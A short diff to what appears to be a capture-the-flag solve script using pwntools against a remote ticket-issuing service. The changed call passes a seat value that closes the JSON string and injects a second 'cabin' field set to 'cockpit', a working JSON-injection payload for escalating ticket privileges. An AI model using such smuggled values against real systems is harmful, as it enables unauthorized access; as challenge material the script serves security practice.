@@ -13,6 +13,7 @@ def ticket_code(title, first_name, last_name, seat):
         p = remote(REMOTE_ADDR, REMOTE_PORT)
     else:
         p = e.process()
+    print("{\"name\": \"" + title + " " + first_name + " " + last_name + "\", \"cabin\": \"" + "Economy" + "\", \"seat\": \"" + seat + "\"}")
 
     p.sendlineafter(b"Title>", str(title).encode())
     p.sendlineafter(b"First Name>", str(first_name).encode())
@@ -32,6 +33,5 @@ def verify_ticket(token):
     return p.recvline()
 
 
-ticket = ticket_code("Madam", "Bingo", "Healer", "1A")
-print(ticket)
+ticket = ticket_code("a", "b", "c", "\",\"cabin\":\"cockpit")
 print(verify_ticket(ticket))
